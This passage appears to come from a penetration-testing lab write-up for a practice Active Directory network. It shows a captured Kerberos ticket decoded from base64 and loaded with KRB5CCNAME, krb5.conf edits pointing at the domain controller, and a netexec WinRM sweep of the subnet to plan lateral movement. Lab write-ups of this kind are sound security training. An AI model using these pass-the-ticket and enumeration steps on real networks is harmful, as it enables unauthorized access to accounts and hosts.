svbdJ5+snc5Ykvf2uJmrKKnyQTO9+Wk9++DcM5iXUDvePv4fIplTg3hkW4Vuj8jiHGad3xD2I+DW2mKUtqIu9ioz3UxN+fZ/s6N11ElpkoWoAs9/5Hpk81lZqaeJZ6sf7xelbnTf0tpjqmlaNy1JkK0kG0alxjZ7FrMJN4zT8QXDVGstU+vbNF2ix54nBYRbJGkjQSd9h8KNfERZMRSPD+Ud09Ir7xPlu3TaGWUcZDUGKsDYcNr40i6Wn67kJE8fQT3TA+eBRKre3+t114zNWxVKDhrMWS77eVxGijR9sOaWntN17pDJlF1F89shTo/0KhSfecoZN3UKI6UPe0LtBHGbJu9lqJEuJAoVxspK3PTGkzcNuDdq7y2gNdRWp+IJWoONKbC20AECARDT6D5x9Z8fZjGXydFHED9FvcxgmeLjO9wVDdk+yxHTFfPqMNDAPTfMQKbm8OOtysVJEM+OA7xkbw8P6Awjqbg7344D4CzURAkzpArwtnmcBPguql3gDfpuZ4P2JktXNyQmGt7aipR08KiLJQJ9UoDpRQzCzFUGudqOnSfc2g8qneAXYak65vXh1T2AaWgIqa7zncvOKsu42lATFew7nw1AuYmKZa86RvivJcbSc7wJPBaBU4AeyAzjeQYjmdcAvsXEz2zJynMd4c1Zfg6gqRqgqyFQomAAAAAA=="|base64 -d> conor.brown.ccache
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ export KRB5CCNAME=/home/user/Downloads/Shinra/conor.brown.ccache
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ klist
Ticket cache: FILE:/home/user/Downloads/Shinra/conor.brown.ccache
Default principal: Conor.Brown@SHINRA-DEV.VL

Valid starting       Expires              Service principal
03/25/2026 05:14:14  03/25/2026 15:14:14  krbtgt/SHINRA-DEV.VL@SHINRA-DEV.VL
    renew until 03/27/2026 05:14:14

```

I will fix the local kerberos configuration onmy laptop so that I can login via kerberos on WINRM (I suspect connor can login to the Client04 via WINRM):

```bash
└─$ cat /etc/krb5.conf 
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SHINRA-DEV.VL

[realms]
    SHINRA-DEV.VL = {
        kdc = dc.SHINRA-DEV.VL
        admin_server = dc.SHINRA-DEV.VL
        default_domain = SHINRA-DEV.VL
    }

[domain_realm]
    .SHINRA-DEV.VL = SHINRA-DEV.VL
    SHINRA-DEV.VL = SHINRA-DEV.VL  
```

Now here I lost several hours as I was panicking because nothing worked but apparently I lost a machine in between:

```bash
└─$ netexec winrm 172.16.11.0/24                                       
WINRM       172.16.11.12    5985   CLIENT03         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT03) (domain:shinra-dev.vl) 
WINRM       172.16.11.10    5985   CLIENT01         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT01) (domain:shinra-dev.vl) 
WINRM       172.16.11.50    5985   FILE01           [*] Windows 10 / Server 2019 Build 17763 (name:FILE01) (domain:shinra-dev.vl) 
WINRM       172.16.11.80    5985   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:shinra.vl) 
WINRM       172.16.11.101   5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:shinra-dev.vl) 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

For this reason I suspect I can move on to the third client